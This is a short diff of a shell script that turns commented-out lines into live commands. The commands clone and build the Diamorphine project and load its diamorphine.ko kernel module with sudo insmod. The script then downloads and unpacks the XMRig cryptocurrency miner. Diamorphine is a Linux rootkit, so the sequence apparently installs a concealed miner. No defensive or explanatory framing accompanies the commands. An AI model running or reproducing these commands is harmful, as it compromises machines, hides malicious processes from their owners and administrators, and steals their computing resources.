@@ -1,7 +1,6 @@
-#wget
-# zip -r MyFolder.zip "My Folder"
-#cd Diamorphine && 
-#sudo make && 
-#sudo insmod diamorphine.ko && 
+git clone https://github.com/OverloadedOpRK/Diamorphine && 
+cd Diamorphine && 
+sudo make && 
+sudo insmod diamorphine.ko && 
 wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-noble-x64.tar.gz &&
 tar -xf xmrig-6.21.3-noble-x64.tar.gz && 
